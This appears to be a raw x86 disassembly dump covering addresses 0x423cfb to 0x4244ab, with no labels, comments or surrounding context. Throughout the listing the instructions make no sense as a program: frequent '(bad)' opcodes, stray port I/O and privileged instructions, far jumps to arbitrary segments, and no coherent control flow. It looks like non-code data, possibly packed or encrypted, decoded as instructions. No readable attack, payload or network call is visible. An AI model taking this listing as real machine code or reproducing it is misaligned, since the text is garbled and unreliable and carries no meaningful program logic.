  423cfb:	or     ecx,DWORD PTR [edx]
  423cfd:	and    al,0xfd
  423cff:	xchg   ebx,eax
  423d00:	ret    0xa6fa
  423d03:	sub    al,0xa6
  423d05:	(bad)  
  423d06:	push   0xffffffb6
  423d08:	push   0x82a9549f
  423d0d:	jecxz  0x423ce7
  423d0f:	mov    ds:0x2809900b,eax
  423d14:	shl    ah,1
  423d16:	pushf  
  423d17:	ja     0x423d68
  423d19:	clc    
  423d1a:	sub    dl,dh
  423d1c:	inc    eax
  423d1d:	mov    al,ds:0x62d71217
  423d22:	out    dx,eax
  423d23:	inc    edi
  423d24:	cmp    eax,0xce85b310
  423d29:	mov    eax,ds:0x55575244
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax-0x35f20192],ah
  423d38:	(bad)  
  423d3a:	mov    al,0xcb
  423d3c:	add    DWORD PTR [eax],eax
  423d3e:	mov    BYTE PTR [esi],al
  423d40:	add    BYTE PTR [eax],al
  423d42:	jnp    0x423ce8
  423d44:	fldenv [edx]
  423d46:	(bad)  
  423d48:	cmp    ecx,DWORD PTR [ebp+ebp*2+0x1040db64]
  423d4f:	hlt    
  423d50:	out    dx,al
  423d51:	xor    BYTE PTR [eax-0x75],dl
  423d54:	data16 lods al,BYTE PTR ds:[esi]
  423d56:	shl    BYTE PTR [ebx],cl
  423d58:	and    eax,0xa74ec83a
  423d5d:	push   ebx
  423d5e:	enter  0xaad2,0xdb
  423d62:	jg     0x423ddb
  423d64:	popf   
  423d65:	es out 0x20,eax
  423d68:	stos   BYTE PTR es:[edi],al
  423d69:	in     eax,dx
  423d6a:	mov    esi,0x99e662d
  423d6f:	inc    eax
  423d70:	adc    BYTE PTR [eax+0x526d7a57],al
  423d76:	mov    dh,0x9
  423d78:	aam    0x5a
  423d7a:	sti    
  423d7b:	pop    esi
  423d7c:	mov    ah,0x56
  423d7e:	aam    0xd6
  423d80:	std    
  423d81:	int    0xf9
  423d83:	mov    al,ds:0x9da2cc8a
  423d88:	jne    0x423d68
  423d8a:	fdiv   QWORD PTR [ebp-0x11]
  423d8d:	mov    WORD PTR [ebx+0x55e0eeb8],?
  423d93:	sti    
  423d94:	jbe    0x423d8c
  423d96:	nop
  423d97:	xor    al,0x3
  423d99:	inc    esi
  423d9a:	jae    0x423d89
  423d9c:	mov    ebx,0x4a1da221
  423da1:	rcr    BYTE PTR [ebx-0x1962eb6b],cl
  423da7:	dec    esp
  423da8:	mov    ebx,DWORD PTR [edx]
  423daa:	ins    BYTE PTR es:[edi],dx
  423dab:	ss stos BYTE PTR es:[edi],al
  423dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dae:	cmc    
  423daf:	out    0xe9,eax
  423db1:	mov    esi,0x3b0d5728
  423db6:	push   edx
  423db7:	ss cli 
  423db9:	push   edi
  423dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dbb:	adc    ah,BYTE PTR [edi-0x6d]
  423dbe:	jmp    0x6f69:0xa282ac0b
  423dc5:	retf   0xde1c
  423dc8:	fwait
  423dc9:	fs gs (bad) 
  423dcc:	jmp    0x91a2:0x9beb1b57
  423dd3:	cmc    
  423dd4:	push   ds
  423dd5:	mov    bh,0x5a
  423dd7:	fistp  WORD PTR [eax-0x40]
  423dda:	test   DWORD PTR [esi],esi
  423ddc:	loopne 0x423e03
  423dde:	pop    ebp
  423ddf:	dec    edi
  423de0:	ret    0x4075
  423de3:	rcr    BYTE PTR ds:0x31e56393,0xe2
  423dea:	pop    edi
  423deb:	xlat   BYTE PTR ds:[ebx]
  423dec:	pushf  
  423ded:	jbe    0x423e43
  423def:	xchg   BYTE PTR [ebp-0x57],bh
  423df2:	jmp    0x394f:0xe45c90c9
  423df9:	les    ebx,FWORD PTR [ebx]
  423dfb:	mov    bl,0x2b
  423dfd:	dec    ebp
  423dfe:	sub    eax,0x9995006f
  423e03:	scas   al,BYTE PTR es:[edi]
  423e04:	inc    eax
  423e05:	mov    ebx,ecx
  423e07:	clc    
  423e08:	cmp    al,0xc7
  423e0a:	sub    BYTE PTR [edi+0xfd5736c],dh
  423e10:	dec    edx
  423e11:	pop    es
  423e12:	add    DWORD PTR [ebp-0x79fcafdd],edx
  423e18:	jo     0x423e69
  423e1a:	frstor [edx-0x46]
  423e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e1e:	jae    0x423e0d
  423e20:	jns    0x423e5e
  423e22:	pop    edx
  423e23:	pop    esi
  423e24:	mov    DWORD PTR [edi],ecx
  423e26:	xor    eax,ecx
  423e28:	(bad)  
  423e29:	xor    eax,0xb970d03
  423e2e:	cmp    esp,eax
  423e30:	inc    ecx
  423e31:	in     al,0x85
  423e33:	jp     0x423e31
  423e35:	or     eax,DWORD PTR [edi+0x6d]
  423e38:	push   esp
  423e39:	pop    esp
  423e3a:	bound  ebx,QWORD PTR [eax-0x5d]
  423e3d:	mov    esp,0x53e2d93a
  423e42:	gs scas al,BYTE PTR es:[edi]
  423e44:	cli    
  423e45:	ja     0x423e33
  423e47:	lahf   
  423e48:	mov    al,ds:0xd2271653
  423e4d:	popf   
  423e4e:	inc    edi
  423e4f:	adc    al,0xcb
  423e51:	repz daa 
  423e53:	mov    ds:0xb9a33d22,eax
  423e58:	ss push ss
  423e5a:	xchg   ecx,eax
  423e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e5c:	mov    eax,DWORD PTR [edx]
  423e5e:	mov    BYTE PTR [edx+0xfb72bcc],bh
  423e64:	out    dx,al
  423e65:	fcmovbe st,st(1)
  423e67:	push   ecx
  423e68:	jbe    0x423eca
  423e6a:	dec    esp
  423e6b:	sub    edx,esp
  423e6d:	(bad)  
  423e6e:	jmp    0x423e8a
  423e70:	xor    al,0x5b
  423e72:	jb     0x423ea7
  423e74:	mov    al,ds:0x35b17a83
  423e79:	or     BYTE PTR [ecx-0x1f],dh
  423e7c:	push   ebx
  423e7d:	arpl   WORD PTR [ecx],di
  423e7f:	push   ecx
  423e80:	jp     0x423e06
  423e82:	mov    eax,0x5457e15b
  423e87:	sub    dh,BYTE PTR [esi]
  423e89:	pusha  
  423e8a:	retf   0xc207
  423e8d:	into   
  423e8e:	xchg   DWORD PTR [esp+eax*1-0x43],ebx
  423e92:	jge    0x423f01
  423e94:	sub    al,0x60
  423e96:	xor    al,0xaf
  423e98:	sbb    cl,BYTE PTR gs:[ebx-0x51]
  423e9c:	pop    ds
  423e9d:	jg     0x423e74
  423e9f:	pop    ebp
  423ea0:	repnz push 0xbd8b2a4d
  423ea6:	xchg   esp,eax
  423ea7:	mov    esi,0x3fa76dc3
  423eac:	pop    ebp
  423ead:	fisubr WORD PTR [edi+0x7c]
  423eb0:	nop
  423eb1:	add    BYTE PTR [eax-0x29],0x74
  423eb5:	in     al,0x40
  423eb7:	mov    eax,0x6d69476a
  423ebc:	repnz cli 
  423ebe:	mov    ah,0x81
  423ec0:	mov    DWORD PTR [esi*2+0x540efa36],esp
  423ec7:	inc    ebp
  423ec8:	bound  ecx,QWORD PTR [edx]
  423eca:	in     al,dx
  423ecb:	stc    
  423ecc:	popa   
  423ecd:	pop    ebp
  423ece:	mov    al,0x51
  423ed0:	in     eax,0x60
  423ed2:	xlat   BYTE PTR ds:[ebx]
  423ed3:	mov    edx,0xff42837e
  423ed8:	mov    dl,0x57
  423eda:	mov    cl,0x62
  423edc:	daa    
  423edd:	push   0x2167fca6
  423ee2:	das    
  423ee3:	sahf   
  423ee4:	cli    
  423ee5:	test   dl,dh
  423ee7:	xacquire xchg BYTE PTR [eax+0x47],ah
  423eeb:	neg    dl
  423eed:	iret   
  423eee:	or     al,0xc8
  423ef0:	mov    ds:0xccf94f2,al
  423ef5:	in     al,dx
  423ef6:	cmp    BYTE PTR [eax+0x9c5b762],bl
  423efc:	inc    ecx
  423efd:	cdq    
  423efe:	leave  
  423eff:	ja     0x423f70
  423f01:	neg    edx
  423f03:	adc    DWORD PTR [esi],esp
  423f05:	and    ah,BYTE PTR ds:0x35670b5a
  423f0b:	inc    ebp
  423f0c:	sbb    eax,0xbf92e2df
  423f11:	add    DWORD PTR [eax],edi
  423f13:	addr16 push esp
  423f15:	fiadd  WORD PTR [edi+esi*8-0x40af7e2e]
  423f1c:	push   esi
  423f1d:	sbb    ebp,ecx
  423f1f:	mov    BYTE PTR [esi],cl
  423f21:	xlat   BYTE PTR ds:[ebx]
  423f22:	inc    ecx
  423f23:	loopne 0x423ee9
  423f25:	adc    al,0xf3
  423f27:	daa    
  423f28:	nop
  423f29:	sti    
  423f2a:	xor    al,0xec
  423f2c:	and    DWORD PTR ds:0xf4b83896,ebp
  423f32:	and    DWORD PTR ds:0x9fe8d6cd,ebp
  423f38:	in     al,0xc7
  423f3a:	ss xor ah,dl
  423f3d:	popf   
  423f3e:	adc    DWORD PTR [edi+0x31],eax
  423f41:	inc    eax
  423f42:	jne    0x423ec8
  423f44:	and    dl,dh
  423f46:	imul   edi,DWORD PTR [edi-0x2a],0xffffffd5
  423f4a:	lahf   
  423f4b:	inc    ebp
  423f4c:	mov    edx,0xfbcadf8b
  423f51:	cmp    bh,BYTE PTR [eax]
  423f53:	or     cl,BYTE PTR [esi-0x3c]
  423f56:	dec    esp
  423f57:	enter  0x618b,0x19
  423f5b:	and    ebx,DWORD PTR [esi-0x33]
  423f5e:	sar    DWORD PTR [eax-0x38723fc],1
  423f64:	stc    
  423f65:	retf   0x82b6
  423f68:	fcomp  QWORD PTR [bx+si-0x6054]
  423f6d:	sbb    esp,esi
  423f6f:	outs   dx,BYTE PTR ds:[esi]
  423f70:	adc    DWORD PTR [edi],ecx
  423f72:	inc    eax
  423f73:	pop    esi
  423f74:	mov    BYTE PTR [esi+0x50facba0],al
  423f7a:	lods   eax,DWORD PTR ds:[esi]
  423f7b:	cmp    bh,BYTE PTR [ebp+0x650340d8]
  423f81:	add    BYTE PTR [edi+eax*8-0x20],dh
  423f85:	pop    ss
  423f86:	mov    edi,0x62706194
  423f8b:	cmc    
  423f8c:	in     eax,0x58
  423f8e:	xchg   edi,eax
  423f8f:	cmp    ah,BYTE PTR [esi+0x7b1d3ded]
  423f95:	call   0x2b267e43
  423f9a:	inc    eax
  423f9b:	loopne 0x423f3b
  423f9d:	jb     0x423ff6
  423f9f:	xchg   ebp,eax
  423fa0:	inc    ecx
  423fa1:	pop    eax
  423fa2:	outs   dx,DWORD PTR ds:[esi]
  423fa3:	icebp  
  423fa4:	(bad)  gs:[edx-0x2d]
  423fa8:	in     al,0x61
  423faa:	mov    al,0x5c
  423fac:	into   
  423fad:	dec    ebx
  423fae:	mov    esi,0x41dde461
  423fb3:	jmp    0xb77e:0xadd33363
  423fba:	sti    
  423fbb:	ja     0x423fd8
  423fbd:	xor    DWORD PTR [ecx+ebx*8+0x24d31a42],ebp
  423fc4:	dec    ecx
  423fc5:	push   0xa1e71e83
  423fca:	cdq    
  423fcb:	push   eax
  423fcc:	cli    
  423fcd:	clc    
  423fce:	and    BYTE PTR [ebp+0x73d5ffc8],cl
  423fd4:	ret    0xfa42
  423fd7:	sub    ebp,DWORD PTR [esp+esi*4]
  423fda:	fild   QWORD PTR [esi-0x32]
  423fdd:	(bad)  [edx]
  423fdf:	jle    0x423f71
  423fe1:	mov    ecx,0x2cf40576
  423fe6:	mov    ds:0x5c60507,al
  423feb:	and    al,0xa3
  423fed:	ret    0x863a
  423ff0:	retf   
  423ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ff2:	aaa    
  423ff3:	pop    esi
  423ff4:	adc    ch,BYTE PTR [edx]
  423ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ff7:	les    esi,FWORD PTR [ecx-0x65eeebe3]
  423ffd:	std    
  423ffe:	pusha  
  423fff:	sbb    bh,BYTE PTR [edx+0x63ef1729]
  424005:	leave  
  424006:	pop    es
  424007:	fsub   QWORD PTR [ebx+0x74]
  42400b:	aad    0xd6
  42400d:	sub    DWORD PTR [esi+0x15],eax
  424010:	es dec edx
  424012:	dec    ecx
  424013:	mov    ecx,0x4b506624
  424018:	cmp    ecx,0xffffffd7
  42401b:	test   eax,0x21d329e5
  424020:	dec    ebp
  424021:	int3   
  424022:	pop    esp
  424023:	es mov bh,0x22
  424026:	dec    ebp
  424027:	sbb    esp,DWORD PTR [edi-0x61]
  42402a:	ret    
  42402b:	adc    ebx,DWORD PTR [ebx-0x4cc1c71e]
  424031:	scas   eax,DWORD PTR es:[edi]
  424032:	xchg   esi,eax
  424033:	push   ecx
  424034:	mov    ch,0x71
  424036:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  424038:	adc    dl,0x5e
  42403b:	scas   eax,DWORD PTR es:[edi]
  42403c:	cmp    al,0xbf
  42403e:	mov    bl,0x42
  424040:	enter  0xfb74,0xb9
  424044:	out    0x5a,al
  424046:	push   edi
  424047:	jle    0x4240a3
  424049:	inc    ecx
  42404a:	test   al,0x5
  42404c:	xchg   ebx,eax
  42404d:	fld    TBYTE PTR [ebx-0x78]
  424050:	xchg   ecx,eax
  424051:	jne    0x424088
  424053:	gs idiv bh
  424056:	mov    ch,0xd3
  424058:	scas   al,BYTE PTR es:[edi]
  424059:	clc    
  42405a:	sysexit 
  42405c:	cmp    eax,0xa7f84622
  424061:	mov    ebp,0x7b97fc7d
  424066:	retf   
  424067:	dec    edx
  424068:	fcmovne st,st(5)
  42406a:	mov    dl,0x1f
  42406c:	push   ss
  42406d:	out    0x1,al
  42406f:	add    eax,0x7b4f6ca6
  424074:	adc    ecx,ecx
  424076:	xchg   esi,eax
  424077:	adc    DWORD PTR [edi],0xffffffd2
  42407a:	pop    ebp
  42407b:	in     eax,0x5e
  42407d:	aas    
  42407e:	or     BYTE PTR [ebx+0xb],cl
  424081:	pop    es
  424082:	adc    DWORD PTR ds:0xa1f07c30,ebp
  424088:	(bad)  
  424089:	shl    al,1
  42408b:	test   eax,0x911e6b53
  424090:	in     al,0x78
  424092:	out    dx,al
  424093:	pushf  
  424094:	add    ecx,ecx
  424096:	xchg   edx,eax
  424097:	aaa    
  424098:	xchg   dx,ax
  42409a:	and    al,0x61
  42409c:	rcl    DWORD PTR [eax+0x48],cl
  42409f:	sbb    bh,BYTE PTR [edi+0x382afb3f]
  4240a5:	ins    DWORD PTR es:[edi],dx
  4240a6:	jmp    DWORD PTR [edx+esi*1]
  4240a9:	mov    al,ds:0x5513d5b9
  4240ae:	jb     0x424110
  4240b0:	mov    al,0xb7
  4240b2:	sub    DWORD PTR ds:0xb8afa00e,0x946e54b4
  4240bc:	les    edx,FWORD PTR [eax-0x1c1ec42e]
  4240c2:	jne    0x424126
  4240c4:	(bad)  
  4240c6:	fs jecxz 0x42411e
  4240c9:	(bad)  
  4240ca:	xchg   esp,eax
  4240cb:	pop    edi
  4240cc:	sbb    eax,0xe5a0817f
  4240d1:	lods   eax,DWORD PTR ds:[esi]
  4240d2:	hlt    
  4240d3:	inc    esi
  4240d4:	push   0x35
  4240d6:	int3   
  4240d7:	xchg   ebp,eax
  4240d8:	inc    ebp
  4240d9:	xchg   esp,eax
  4240da:	inc    ecx
  4240db:	adc    eax,edx
  4240dd:	jns    0x4240de
  4240df:	stc    
  4240e0:	data16 jl 0x4240c2
  4240e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240e4:	mov    ch,0x8a
  4240e6:	xor    BYTE PTR [ebx-0x3a],bh
  4240e9:	sub    dl,bl
  4240eb:	dec    edx
  4240ec:	call   0x6661:0x2a38ad97
  4240f3:	add    al,0xae
  4240f5:	(bad)  
  4240f6:	call   0xe9eda794
  4240fb:	fmul   QWORD PTR [edx-0x67]
  4240fe:	loop   0x424087
  424100:	daa    
  424101:	xlat   BYTE PTR ds:[ebx]
  424102:	mov    edx,0x25717d75
  424107:	stos   DWORD PTR es:[edi],eax
  424108:	xor    BYTE PTR [edx],al
  42410a:	cmp    ecx,DWORD PTR [edi]
  42410c:	push   0xffffff9c
  42410e:	add    eax,DWORD PTR [eax+ecx*4-0x48f5f469]
  424115:	fwait
  424116:	div    DWORD PTR [ebx]
  424118:	jl     0x424194
  42411a:	jmp    FWORD PTR [edx+0x499ac484]
  424120:	ins    DWORD PTR es:[edi],dx
  424121:	test   DWORD PTR [ebp-0x7e],esp
  424124:	xor    ch,bl
  424126:	dec    ebp
  424127:	out    0x72,eax
  424129:	shr    BYTE PTR [ebp+0x530c8db9],1
  42412f:	push   edi
  424130:	pop    edi
  424131:	loop   0x424115
  424133:	push   edi
  424134:	cld    
  424135:	xor    DWORD PTR cs:[ecx],0x47
  424139:	or     ecx,esp
  42413b:	(bad)  
  42413c:	sub    esi,ebx
  42413e:	dec    ecx
  42413f:	mov    ah,0x80
  424141:	(bad)  [esp+eax*4-0x72]
  424145:	adc    eax,0x3a2c2b74
  42414a:	inc    edx
  42414b:	(bad)  
  42414c:	stc    
  42414d:	sub    DWORD PTR [ebx-0x19432172],esi
  424153:	fisttp WORD PTR [edx-0x3e]
  424156:	lahf   
  424157:	mov    ecx,0xbe28ab17
  42415c:	inc    ecx
  42415d:	lea    esi,[edi-0x50]
  424160:	call   0xb61e:0x85dcceb
  424167:	pop    esp
  424168:	aas    
  424169:	mov    ah,0x8a
  42416b:	into   
  42416c:	stc    
  42416d:	retf   
  42416e:	and    DWORD PTR [eax+0x63],esi
  424171:	push   ss
  424172:	mov    al,0x27
  424174:	out    dx,al
  424175:	fimul  WORD PTR [edx]
  424177:	dec    eax
  424178:	xor    ebx,DWORD PTR [ebp-0x34]
  42417b:	mov    edx,0x2e0c0ab6
  424180:	hlt    
  424181:	inc    ebx
  424182:	mov    edi,0xe99d7788
  424187:	xchg   BYTE PTR [ebp+0x77aa2d3d],ch
  42418d:	(bad)  
  42418e:	or     ebx,DWORD PTR [eax-0x6a9dd2a7]
  424194:	sbb    ah,BYTE PTR [esi+0x7e906614]
  42419a:	push   ebp
  42419b:	repz xchg edi,eax
  42419d:	push   ebx
  42419e:	add    DWORD PTR [eax+0x2a628374],0xffffff93
  4241a5:	sub    eax,0xf3057f8a
  4241aa:	cdq    
  4241ab:	dec    esp
  4241ac:	mov    WORD PTR [ecx],?
  4241ae:	mov    dh,0x47
  4241b0:	sbb    BYTE PTR [esp+eax*1-0xb],cl
  4241b4:	adc    al,0x54
  4241b6:	test   eax,0x5caf2ec5
  4241bb:	sbb    bh,0x58
  4241be:	aam    0x42
  4241c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241c1:	cmp    al,0x91
  4241c3:	data16 jge 0x4241c4
  4241c6:	shr    ebx,1
  4241c8:	sbb    eax,0x80a17c3d
  4241cd:	jge    0x424232
  4241cf:	xchg   ecx,eax
  4241d0:	stos   BYTE PTR es:[edi],al
  4241d1:	jmp    FWORD PTR [eax+0x16c62a1f]
  4241d7:	adc    eax,0xd8674d79
  4241dc:	xor    al,BYTE PTR [edi]
  4241de:	ret    
  4241df:	inc    eax
  4241e0:	sbb    BYTE PTR [ebp+ebx*4+0x50eb6434],ch
  4241e7:	pop    ebx
  4241e8:	sub    DWORD PTR [ebx+ebp*4-0x1a],ecx
  4241ec:	mov    ds:0xb89ce6b1,al
  4241f1:	push   0xa
  4241f3:	xchg   edi,eax
  4241f4:	arpl   WORD PTR [esi-0x64],bx
  4241f7:	inc    esi
  4241f8:	shl    DWORD PTR [ecx-0x2a],0xc1
  4241fc:	pop    ebx
  4241fd:	sbb    al,0x92
  4241ff:	inc    edi
  424200:	add    DWORD PTR [esi],esp
  424202:	sub    al,0x6c
  424204:	mov    BYTE PTR [edi],0x57
  424207:	pop    edi
  424208:	xchg   BYTE PTR [edx],bl
  42420a:	mov    DWORD PTR [esi+0x4f3cca31],ebp
  424210:	fwait
  424211:	push   esi
  424212:	or     BYTE PTR [ebp+0x407f7a76],dl
  424218:	arpl   WORD PTR gs:[ebx-0x17],sp
  42421c:	into   
  42421d:	(bad)  
  42421e:	fmul   QWORD PTR [ecx+eiz*4-0x7ac7eee0]
  424225:	mov    edi,0x476a6783
  42422a:	outs   dx,BYTE PTR ds:[esi]
  42422b:	push   esi
  42422c:	jb     0x424268
  42422e:	leave  
  42422f:	mov    eax,ds:0xe1b69d63
  424234:	mov    ecx,0x7d91dada
  424239:	repz add eax,0x27c71524
  42423f:	ret    0x6fdf
  424242:	mov    bh,0xc8
  424244:	rcr    DWORD PTR [esi+eiz*8+0x17b7f4c4],0x29
  42424c:	jae    0x4241fd
  42424e:	add    al,0x9d
  424250:	ret    0x8254
  424253:	sub    BYTE PTR [ecx+ecx*8-0x5e],ah
  424257:	adc    BYTE PTR [ecx-0x374102a7],ah
  42425d:	cmp    eax,0x7
  424260:	add    al,0x60
  424262:	cs or  edx,ebp
  424265:	test   DWORD PTR [ebx+0x7caf6446],ecx
  42426b:	ret    0x3c0a
  42426e:	xor    al,0xa4
  424270:	adc    esi,DWORD PTR [eax+0x12]
  424273:	push   eax
  424274:	retf   0xdebb
  424277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424278:	je     0x42428f
  42427a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42427b:	or     al,0x97
  42427d:	adc    DWORD PTR [edx+0x6688e63b],edx
  424283:	popf   
  424284:	repz fdivr st(1),st
  424287:	out    0xf8,eax
  424289:	shr    DWORD PTR [esi-0x8],1
  42428c:	sub    ebp,esi
  42428e:	and    BYTE PTR [ecx],bh
  424290:	jle    0x42429e
  424292:	add    DWORD PTR [esi+0x71],ecx
  424295:	dec    esi
  424296:	mov    esp,0xf62fdc45
  42429b:	mov    dl,0xd7
  42429d:	mov    bh,0x33
  42429f:	cli    
  4242a0:	xchg   ecx,eax
  4242a1:	dec    esp
  4242a2:	leave  
  4242a3:	dec    ebx
  4242a4:	pop    edi
  4242a5:	je     0x4242ff
  4242a7:	dec    ebp
  4242a8:	or     al,0xb5
  4242aa:	lods   eax,DWORD PTR es:[esi]
  4242ac:	cld    
  4242ad:	shl    DWORD PTR [esp+ecx*1+0x46],1
  4242b1:	inc    esi
  4242b2:	jbe    0x4242e2
  4242b4:	push   ebx
  4242b5:	popf   
  4242b6:	xchg   edi,eax
  4242b7:	fcomp  DWORD PTR [ebx-0x10]
  4242ba:	jbe    0x42425b
  4242bc:	cmp    eax,DWORD PTR [ecx+edi*4+0x4a]
  4242c0:	jmp    0x5335:0x16e5e49c
  4242c7:	jg     0x424295
  4242c9:	ds cdq 
  4242cb:	push   ebp
  4242cc:	jb     0x424289
  4242ce:	sbb    ebp,ecx
  4242d0:	out    0x3,al
  4242d2:	popf   
  4242d3:	push   eax
  4242d4:	dec    esp
  4242d5:	cld    
  4242d6:	(bad)  
  4242d7:	jecxz  0x424283
  4242d9:	mov    cl,0xdc
  4242db:	mov    BYTE PTR [ebx],0x17
  4242de:	popa   
  4242df:	sub    al,0x31
  4242e1:	jmp    0x7e4a0a02
  4242e6:	test   DWORD PTR [esi+ecx*1-0x2be589ee],ecx
  4242ed:	ins    DWORD PTR es:[edi],dx
  4242ee:	push   es
  4242ef:	or     al,0xa7
  4242f1:	mov    ebx,0x8a8a0059
  4242f6:	pop    eax
  4242f7:	clc    
  4242f8:	ret    
  4242f9:	call   0x2b17355b
  4242fe:	stos   DWORD PTR es:[edi],eax
  4242ff:	jmp    0xf21ae40e
  424304:	jae    0x424318
  424306:	aam    0xbe
  424308:	cs dec ecx
  42430a:	stc    
  42430b:	lahf   
  42430c:	xchg   ebx,eax
  42430d:	and    esp,DWORD PTR [ebx+0x3f]
  424310:	sti    
  424311:	mov    edx,0xfaa334dc
  424316:	and    edi,DWORD PTR [ebp-0x71]
  424319:	cwde   
  42431a:	mov    eax,ds:0xba98580b
  42431f:	in     al,dx
  424320:	arpl   WORD PTR [eax-0x3f],cx
  424323:	cld    
  424324:	inc    edi
  424325:	add    eax,0x79c69808
  42432a:	test   eax,0x85f884c1
  42432f:	xchg   BYTE PTR [edi+0x76],cl
  424332:	mov    eax,ds:0xa7f21175
  424337:	fsub   st,st(6)
  424339:	dec    ecx
  42433a:	xchg   ebp,eax
  42433b:	push   esp
  42433c:	cmp    DWORD PTR [ebp-0x1a8728d8],esi
  424342:	mov    eax,ds:0xb48b485b
  424347:	nop
  424348:	hlt    
  424349:	inc    ebx
  42434a:	call   0x61c0:0x558078bc
  424351:	test   al,0x4c
  424353:	lahf   
  424354:	fucomip st,st(0)
  424356:	retf   0xb4ee
  424359:	xchg   ecx,eax
  42435a:	xor    BYTE PTR [edi+0x25],ch
  42435d:	inc    esp
  42435e:	in     eax,0xa
  424360:	xchg   edi,eax
  424361:	sbb    al,0x12
  424363:	inc    esi
  424364:	and    BYTE PTR [ebp+0x54],ch
  424367:	addr16 into 
  424369:	in     eax,dx
  42436a:	dec    ecx
  42436b:	jle    0x424362
  42436d:	scas   al,BYTE PTR es:[edi]
  42436e:	call   0x8645:0x9bbee265
  424375:	jle    0x4243a6
  424377:	push   ebx
  424378:	inc    eax
  424379:	pop    ds
  42437a:	(bad)  [ebp+0xa017427]
  424380:	mov    ch,0xda
  424382:	sub    ah,0xf7
  424385:	xor    al,0x96
  424387:	in     al,dx
  424388:	add    ecx,edx
  42438a:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  42438c:	icebp  
  42438d:	sbb    al,0xa8
  42438f:	into   
  424390:	repz pop ebx
  424392:	xor    edx,DWORD PTR [ecx+0x79126034]
  424398:	sbb    eax,0x86ad4cff
  42439d:	(bad)  
  42439e:	(bad)  
  42439f:	xor    BYTE PTR [ecx],ch
  4243a1:	add    eax,ebp
  4243a3:	and    al,0xf0
  4243a5:	sar    al,0xb5
  4243a8:	retf   0xcaf6
  4243ab:	mov    dl,0xef
  4243ad:	test   al,0x9b
  4243af:	sub    DWORD PTR [edi-0x32760ef0],eax
  4243b5:	xchg   ecx,eax
  4243b6:	int    0x17
  4243b8:	loop   0x42439a
  4243ba:	cmp    al,0x15
  4243bc:	adc    al,BYTE PTR [ecx+0x3d]
  4243bf:	in     al,0x82
  4243c1:	stos   BYTE PTR es:[edi],al
  4243c2:	add    DWORD PTR [ebx+0x49fb3eef],ebp
  4243c8:	jle    0x424436
  4243ca:	pop    edx
  4243cb:	inc    esp
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x424430
  4243d7:	ret    
  4243d8:	outs   dx,BYTE PTR ds:[esi]
  4243d9:	out    dx,eax
  4243da:	cmp    dl,dl
  4243dc:	add    DWORD PTR [eax],eax
  4243de:	mov    BYTE PTR [esi],al
  4243e0:	add    BYTE PTR [eax],al
  4243e2:	jno    0x42441a
  4243e4:	add    eax,0x535119bf
  4243e9:	inc    ecx
  4243ea:	add    al,0xa
  4243ec:	iret   
  4243ed:	je     0x42442e
  4243ef:	cmp    al,0x82
  4243f1:	test   BYTE PTR [esi+0x288b05bd],dl
  4243f7:	outs   dx,BYTE PTR gs:[esi]
  4243f9:	mov    ebx,0x368faa3a
  4243fe:	xchg   BYTE PTR [edx-0x40beed11],dl
  424404:	jmp    0x4243af
  424406:	lahf   
  424407:	push   ebp
  424408:	std    
  424409:	push   edi
  42440a:	inc    ecx
  42440b:	fld    DWORD PTR [edx+0x7293b4ce]
  424411:	in     eax,0xb0
  424413:	sbb    cl,dh
  424415:	ds add ax,0x10ab
  42441a:	rol    DWORD PTR [eax+ecx*2-0x3bc6e869],0xb
  424422:	push   ecx
  424423:	(bad)  
  424424:	or     dl,ch
  424426:	into   
  424427:	sbb    eax,0xb2121484
  42442c:	sub    DWORD PTR [ebx],edi
  42442e:	in     eax,dx
  42442f:	dec    eax
  424430:	lods   al,BYTE PTR ds:[esi]
  424431:	mov    edx,0x63e2295c
  424436:	push   esp
  424437:	push   ebx
  424438:	mov    DWORD PTR [edx],ebp
  42443a:	xor    ebp,DWORD PTR [esp+eax*8-0x3]
  42443e:	dec    esi
  42443f:	xchg   ecx,eax
  424440:	jecxz  0x424474
  424442:	xchg   ecx,eax
  424443:	dec    ebx
  424444:	das    
  424445:	xor    dh,BYTE PTR [edi-0x4b13f457]
  42444b:	sbb    al,0x5
  42444d:	cld    
  42444e:	jbe    0x42446e
  424450:	add    ah,BYTE PTR [ecx+0xc]
  424453:	lea    ebx,[esi+ebx*4-0x7f495ea0]
  42445a:	sub    esi,ecx
  42445c:	mov    cl,0x82
  42445e:	shr    DWORD PTR [ecx+0x679bdc0d],0x8b
  424465:	jae    0x424426
  424467:	mov    dh,0x6e
  424469:	arpl   si,sp
  42446b:	xchg   dl,ah
  42446d:	das    
  42446e:	mov    eax,ds:0xa3e93c31
  424473:	mov    ebp,DWORD PTR [ebx-0x5]
  424476:	xlat   BYTE PTR ds:[ebx]
  424477:	test   al,0x56
  424479:	lods   eax,DWORD PTR ds:[esi]
  42447a:	adc    al,0x77
  42447c:	mov    dh,0xa5
  42447e:	adc    al,0x8e
  424480:	jge    0x4244d6
  424482:	out    0xf1,eax
  424484:	adc    DWORD PTR [esi-0x11],ebx
  424487:	cmp    dl,BYTE PTR [ecx]
  424489:	xor    esi,edx
  42448b:	jo     0x424479
  42448d:	sub    DWORD PTR [edi],edx
  42448f:	or     al,0x20
  424491:	loopne 0x4244c0
  424493:	sar    bh,0x65
  424496:	cmp    BYTE PTR [eax+edx*1+0x31],bl
  42449a:	sar    BYTE PTR [esp+edi*2],0x7b
  42449e:	daa    
  42449f:	test   eax,0xecb89c31
  4244a4:	add    al,0x86
  4244a6:	mov    DWORD PTR ss:[ebp+0x2],edx
  4244aa:	pop    ebp
  4244ab:	pop    ecx
